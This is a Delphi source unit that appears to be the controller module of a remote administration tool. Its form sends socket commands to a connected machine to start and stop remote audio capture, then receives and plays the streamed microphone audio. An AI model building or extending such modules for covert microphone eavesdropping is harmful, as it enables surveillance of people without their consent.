unit uAudioStream;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons, ComCtrls, ExtCtrls,winsock,ACMOut, ACMConvertor, MMSystem;

type
  TForm19 = class(TForm)
    stat1: TStatusBar;
    pb1: TProgressBar;
    GroupBox1: TGroupBox;
    Label1: TLabel;
    Label2: TLabel;
    ComboBox1: TComboBox;
    ComboBox2: TComboBox;
    ChkAutoPlayStreams: TCheckBox;
    PngBitBtn1: TBitBtn;
    Memo1: TMemo;
    procedure PngBitBtn1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
    ACMO: TACMOut;
    ACMC: TACMConvertor;
  public
    { Public declarations }
    sRatio:extended;
    sSRation:integer;
    sWidth:integer;
    sHeight:integer;
    sStop:boolean;
    sForm:TObject;
    sPause:boolean;
    procedure ProcessData;
  end;

var
  Form19: TForm19;
  num : INTEger;


implementation

uses uScreenNor;

{$R *.dfm}


procedure TForm19.FormCreate(Sender: TObject);
begin
  ACMO := TACMOut.Create(nil);
  ACMC := TACMConvertor.Create;
  ACMO.NumBuffers := 0;
  ACMO.Open(ACMC.FormatIn);
end;

procedure TForm19.PngBitBtn1Click(Sender: TObject);
var
sock:tSocket;
Data:string;
  Format: TWaveFormatEx;
  Stream: TMemoryStream;
  Command: string;
begin
Memo1.lines.add('establishing remote audio streaming...');
if PngBitBtn1.Caption = 'Start' then begin
sStop := False;
spause := false;
  num := 0;
  Command := '';
  if ComboBox2.Text = 'Stereo' then
    BEGIN
     Format.nChannels := 2;
    END
    else
    BEGIN
    Format.nChannels := 1;
    END;

  Format.nSamplesPerSec := StrToInt(ComboBox1.Text);

  Format.wBitsPerSample := 16;
  Format.nAvgBytesPerSec := Format.nSamplesPerSec * Format.nChannels * 2;
  Format.nBlockAlign := Format.nChannels * 2;

  ACMC.FormatIn.Format.nChannels := Format.nChannels;
  ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
  ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
  ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
  ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;

  Command := INTTOSTR(FORMAt.wFormatTag) + '|' +
  INTTOSTR(FORMAt.nChannels) + '|' +
  INTTOSTR(FORMAt.nSamplesPerSec) + '|' +
  INTTOSTR(FORMAt.nAvgBytesPerSec) + '|' +
  INTTOSTR(FORMAt.nBlockAlign) + '|' +
  INTTOSTR(FORMAt.wBitsPerSample) + '|' +
  INTTOSTR(FORMAt.cbSize) + '|';
  if Stat1.Panels[2].Text = '0' then
  begin
    Data:='';
     Data := '400|' + Stat1.Panels[0].Text + '|' + Command + #10;
     Sock := StrToInt(Stat1.Panels[0].Text);
     Send(Sock, Data[1], Length(Data), 0);
     repeat
       application.ProcessMessages;
     until Stat1.Panels[2].Text <> '0';
  end;

  Data := 'Start|';
  Sock := StrToInt(Stat1.Panels[2].Text);
  Send(Sock, Data[1], Length(Data), 0);
PngBitBtn1.Caption := 'Stop';
end else begin
  sStop := True;
  PngBitBtn1.Caption := 'Start';
  Memo1.lines.add('stopping remote audio streaming...');

  data:='';
  Sock := StrToInt(Stat1.Panels[2].Text);
  Data:='Stop|';
  Send(Sock, Data[1], Length(Data), 0);
  Memo1.lines.add('stopping remote audio stopped.');
  ComboBox1.Enabled := True;
  ComboBox2.Enabled :=True;
  closesocket(StrToInt(Stat1.Panels[2].Text));
end;

end;

procedure TForm19.ProcessData;
var
  Len:integer;
  Buffer: Array[0..1000] Of Char;
  rFile:Array[0..8000] Of Char;
  Data,t:string;
  myTempStream:Tmemorystream;
  Transferedsize,Bytessize,mysize,total,derr:integer;
  sStrList:tstringlist;
  i:integer;
label
  lol;
begin
myTempstream := Tmemorystream.Create;
Memo1.lines.add('remote audio capture established.');
Repeat
  if sStop = false then begin
  Len := Recv(StrToInt(Stat1.Panels[2].Text),Buffer, SizeOf(Buffer), 0);
  If (Len <= 0) Then break;
  Data := String(Buffer);
  ZeroMemory(@Buffer, SizeOf(Buffer));
    if (Copy(data,1,3) = '130') then begin
       mytempstream.Clear;
       delete(data,1,3);
       mysize := strtoint(copy(data,1,pos('|',data) - 1));
       pb1.Position := 0;
       pb1.Max := mysize;
       stat1.Panels.Items[3].Text := 'Size: ' + inttostr(mysize) + ' Bytes';
       TransferedSize := 0;
        BytesSize := 0;
        T := 'ok';
        if mysize < 100 then begin
        spause := true;
        messagebox(Form19.Handle,Pchar('Error!'),Pchar('ERROR!'),0);
        break;
        end;
        If (BytesSize < mysize) Then
        Begin
          Total := 1;
          Repeat
            FillChar(rFile, SizeOf(rFile), 0);
            dErr := Recv(StrToInt(Stat1.Panels[2].Text), rFile, SizeOf(rFile), 0);
            If dErr = -1 Then goto lol;
            if mysize < (derr + total) then begin
              MyTempStream.Write(rFile,mysize - total + 1);
              Inc(Total, derr);
            end else begin
              Inc(Total, dErr);
              MyTempStream.Write(rFile,dErr);
            end;
            pb1.Position := total;
            TransferedSize := Total;
            //Send(StrToInt(Stat1.Panels[2].Text), t[1], length(t), 0);
          Until (Total >= mySize);
       end;
       mytempstream.Position := 0;
       try
        ACMO.Play((mytempstream.memory)^,mytempstream.Size);
       except
       end;
       lol:
       if spause = false then begin
         //pngbitbtn1.Enabled := false;
         //pngbitbtn2.Enabled := true;
       //  T := 'SEND' + inttostr(ssRation) + '|' + inttostr(trackbar1.Position) + '|';
       //  Send(StrToInt(Stat1.Panels[2].Text), t[1], length(t), 0);
       end;
    end;
  end else begin
    Break;
  end;
until 1=2;
Stat1.Panels[2].Text := '0';
myTempstream.Free;
//pngbitbtn1.Enabled := true;
//pngbitbtn2.Enabled := false;
//sjpg.Free;
end;

end.
